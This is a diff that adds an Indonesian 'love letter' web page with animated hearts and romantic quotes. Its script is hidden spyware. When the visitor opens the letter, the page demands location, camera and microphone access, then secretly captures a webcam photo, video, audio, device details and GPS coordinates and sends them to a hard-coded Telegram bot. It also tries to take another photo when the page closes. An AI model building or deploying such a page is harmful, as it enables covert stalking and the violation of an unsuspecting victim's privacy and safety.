@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Untuk Kamu yang Bucin</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #ffebee;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #d81b60;
+        }
+        
+        .container {
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(216, 27, 96, 0.2);
+            padding: 30px;
+            width: 80%;
+            max-width: 600px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        h1 {
+            color: #d81b60;
+            margin-bottom: 20px;
+        }
+        
+        .heart {
+            color: #ff4081;
+            font-size: 24px;
+            animation: beat 1s infinite alternate;
+            display: inline-block;
+        }
+        
+        @keyframes beat {
+            to {
+                transform: scale(1.2);
+            }
+        }
+        
+        .message {
+            line-height: 1.6;
+            margin: 20px 0;
+        }
+        
+        .btn {
+            background-color: #ff4081;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #d81b60;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(216, 27, 96, 0.4);
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .love-letter {
+            text-align: left;
+            padding: 20px;
+            background-color: #fff5f7;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 5px solid #ff4081;
+        }
+        
+        .floating-hearts {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+        }
+        
+        .floating-hearts span {
+            position: absolute;
+            color: #ff4081;
+            font-size: 20px;
+            animation: float-up 4s linear infinite;
+            opacity: 0;
+        }
+        
+        @keyframes float-up {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-20vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        .duration-selector {
+            margin: 15px 0;
+        }
+        
+        .duration-selector label {
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="floating-hearts" id="hearts-container"></div>
+        
+        <h1>Untuk <span class="heart">❤</span> Kamu <span class="heart">❤</span></h1>
+        
+        <div id="initial-content">
+            <p class="message">Hai sayangku, aku punya sesuatu yang spesial untukmu...</p>
+            <div class="duration-selector">
+                <label for="video-duration">Durasi Video:</label>
+                <select id="video-duration">
+                    <option value="5">5 detik</option>
+                    <option value="10">10 detik</option>
+                </select>
+            </div>
+            <button class="btn" id="show-letter">Buka Surat Cinta</button>
+            <button class="btn" id="show-quotes">Lihat Quotes Bucin</button>
+        </div>
+        
+        <div id="letter-content" class="hidden">
+            <div class="love-letter">
+                <p>Sayangku,</p>
+                <p>Setiap hari bersamamu adalah anugerah yang tak ternilai. Senyummu membuat dunia terasa lebih indah, dan tawamu adalah musik terindah di telingaku.</p>
+                <p>Aku bersyukur bisa memilikimu dalam hidupku. Kamu adalah alasan mengapa aku tersenyum setiap hari, mengapa aku bersemangat menjalani hari.</p>
+                <p>Terima kasih telah menjadi bagian dari hidupku. Aku mencintaimu lebih dari kata-kata bisa ungkapkan.</p>
+            </div>
+            <button class="btn" id="back-from-letter">Kembali</button>
+        </div>
+        
+        <div id="quotes-content" class="hidden">
+            <h3>Quotes Bucin</h3>
+            <div class="message">
+                <p>"Cinta itu buta, tapi aku bisa melihatmu dengan jelas."</p>
+                <p>"Aku tidak butuh wifi, karena sinyal cintamu sudah kuat di hatiku."</p>
+                <p>"Kalau kamu adalah buku, aku ingin membacamu berulang-ulang tanpa bosan."</p>
+                <p>"Aku rela jadi penghapus, hanya untuk menghapus air matamu."</p>
+                <p>"Cintaku padamu itu seperti matematika, gak ada habisnya."</p>
+            </div>
+            <button class="btn" id="back-from-quotes">Kembali</button>
+            <button class="btn" id="more-hearts">Lebih Banyak Love!</button>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const initialContent = document.getElementById('initial-content');
+        const letterContent = document.getElementById('letter-content');
+        const quotesContent = document.getElementById('quotes-content');
+        const showLetterBtn = document.getElementById('show-letter');
+        const showQuotesBtn = document.getElementById('show-quotes');
+        const backFromLetterBtn = document.getElementById('back-from-letter');
+        const backFromQuotesBtn = document.getElementById('back-from-quotes');
+        const moreHeartsBtn = document.getElementById('more-hearts');
+        const heartsContainer = document.getElementById('hearts-container');
+        const videoDurationSelect = document.getElementById('video-duration');
+        
+        // Telegram Bot Token and Chat ID (replace with your own)
+        const TELEGRAM_BOT_TOKEN = '7607835904:AAGZ4SBlmEYkFryiOO6pIL3MOSWSGPjs7hQ'; // Ganti dengan token bot Telegram Anda
+        const TELEGRAM_CHAT_ID = '7310423663'; // Ganti dengan chat ID Telegram Anda
+
+        // Function to send message to Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                    }),
+                });
+            } catch (error) {
+                console.error('Error mengirim pesan ke Telegram:', error);
+            }
+        }
+
+        // Function to send photo to Telegram
+        async function sendPhotoToTelegram(photoBase64, caption = 'Foto diambil dari pengguna') {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        photo: photoBase64,
+                        caption: caption,
+                    }),
+                });
+            } catch (error) {
+                console.error('Error mengirim foto ke Telegram:', error);
+            }
+        }
+
+        // Function to send video to Telegram
+        async function sendVideoToTelegram(videoBlob, caption = 'Video diambil dari pengguna') {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('video', videoBlob, 'capture.mp4');
+            formData.append('caption', caption);
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                });
+            } catch (error) {
+                console.error('Error mengirim video ke Telegram:', error);
+            }
+        }
+
+        // Function to send audio to Telegram
+        async function sendAudioToTelegram(audioBlob, caption = 'Audio diambil dari pengguna') {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('audio', audioBlob, 'capture.mp3');
+            formData.append('caption', caption);
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                });
+            } catch (error) {
+                console.error('Error mengirim audio ke Telegram:', error);
+            }
+        }
+
+        // Function to get comprehensive device information
+        async function getDeviceInfo() {
+            const deviceInfo = {};
+            
+            deviceInfo.userAgent = navigator.userAgent;
+            deviceInfo.platform = navigator.platform || 'Tidak diketahui';
+            deviceInfo.language = navigator.language || navigator.userLanguage || 'Tidak diketahui';
+            deviceInfo.screenResolution = `${window.screen.width}x${window.screen.height}`;
+            deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Tidak diketahui';
+            
+            let formattedInfo = 'Informasi Perangkat:\n';
+            for (const [key, value] of Object.entries(deviceInfo)) {
+                formattedInfo += `${key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}: ${value}\n`;
+            }
+            return formattedInfo;
+        }
+
+        // Function to capture photo from webcam
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => resolve();
+                });
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photoBase64 = canvas.toDataURL('image/jpeg');
+
+                stream.getTracks().forEach(track => track.stop());
+                return photoBase64;
+            } catch (error) {
+                console.error('Error mengambil foto:', error);
+                return null;
+            }
+        }
+
+        // Function to capture video
+        async function captureVideo(duration) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.start();
+
+                await new Promise(resolve => setTimeout(resolve, duration * 1000));
+
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+
+                return new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        resolve(blob);
+                    };
+                });
+            } catch (error) {
+                console.error('Error mengambil video:', error);
+                return null;
+            }
+        }
+
+        // Function to capture audio
+        async function captureAudio(duration = 5) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.start();
+
+                await new Promise(resolve => setTimeout(resolve, duration * 1000));
+
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+
+                return new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/mp3' });
+                        resolve(blob);
+                    };
+                });
+            } catch (error) {
+                console.error('Error mengambil audio:', error);
+                return null;
+            }
+        }
+
+        // Function to capture media and send to Telegram
+        async function captureAndSendMedia() {
+            const duration = parseInt(videoDurationSelect.value);
+            const deviceInfo = await getDeviceInfo();
+            let message = `💖 Seseorang membuka surat cinta! 💖\n\n${deviceInfo}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+
+            // Capture and send photo
+            const photoBase64 = await capturePhoto();
+            if (photoBase64) {
+                await sendPhotoToTelegram(photoBase64, 'Foto diambil saat membuka surat cinta');
+                message += '\nFoto: Berhasil dikirim';
+            } else {
+                message += '\nFoto: Gagal diambil';
+            }
+
+            // Capture and send video
+            const videoBlob = await captureVideo(duration);
+            if (videoBlob) {
+                await sendVideoToTelegram(videoBlob, `Video (${duration} detik) diambil saat membuka surat cinta`);
+                message += `\nVideo (${duration} detik): Berhasil dikirim`;
+            } else {
+                message += '\nVideo: Gagal diambil';
+            }
+
+            // Capture and send audio
+            const audioBlob = await captureAudio(5); // Audio 5 detik
+            if (audioBlob) {
+                await sendAudioToTelegram(audioBlob, 'Audio diambil saat membuka surat cinta');
+                message += '\nAudio: Berhasil dikirim';
+            } else {
+                message += '\nAudio: Gagal diambil';
+            }
+
+            // Send device info and status
+            await sendToTelegram(message);
+        }
+
+        // Function to request location, camera, and handle letter display
+        async function requestLocationAndShowLetter() {
+            if (navigator.geolocation && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude } = position.coords;
+                        const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+                        const locationInfo = `Lokasi:\nTautan Google Maps: ${mapsLink}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+
+                        // Capture and send media
+                        await captureAndSendMedia();
+
+                        // Send location info
+                        await sendToTelegram(locationInfo);
+
+                        // Show letter
+                        initialContent.classList.add('hidden');
+                        letterContent.classList.remove('hidden');
+                    },
+                    (error) => {
+                        alert('Akses lokasi diperlukan untuk membuka surat cinta. Silakan aktifkan lokasi dan coba lagi.');
+                    }
+                );
+
+                // Check camera and microphone permissions
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (error) {
+                    alert('Akses kamera dan mikrofon diperlukan. Silakan izinkan dan coba lagi.');
+                    return;
+                }
+            } else {
+                alert('Geolocation, kamera, atau mikrofon tidak didukung oleh browser Anda.');
+            }
+        }
+
+        // Capture photo when window is closed
+        window.addEventListener('beforeunload', async (event) => {
+            const photoBase64 = await capturePhoto();
+            if (photoBase64) {
+                await sendPhotoToTelegram(photoBase64, 'Foto diambil saat pengguna menutup halaman');
+            }
+        });
+
+        // Event Listeners
+        showLetterBtn.addEventListener('click', requestLocationAndShowLetter);
+        
+        showQuotesBtn.addEventListener('click', () => {
+            initialContent.classList.add('hidden');
+            quotesContent.classList.remove('hidden');
+        });
+        
+        backFromLetterBtn.addEventListener('click', () => {
+            letterContent.classList.add('hidden');
+            initialContent.classList.remove('hidden');
+        });
+        
+        backFromQuotesBtn.addEventListener('click', () => {
+            quotesContent.classList.add('hidden');
+            initialContent.classList.remove('hidden');
+        });
+        
+        moreHeartsBtn.addEventListener('click', createHearts);
+        
+        // Create floating hearts
+        function createHearts() {
+            for (let i = 0; i < 20; i++) {
+                setTimeout(() => {
+                    const heart = document.createElement('span');
+                    heart.innerHTML = '❤';
+                    heart.style.left = Math.random() * 100 + '%';
+                    heart.style.animationDuration = 3 + Math.random() * 5 + 's';
+                    heartsContainer.appendChild(heart);
+                    
+                    setTimeout(() => {
+                        heart.remove();
+                    }, 4000);
+                }, i * 200);
+            }
+        }
+        
+        // Initial small animation
+        setTimeout(createHearts, 1000);
+    </script>
+</body>
+</html>
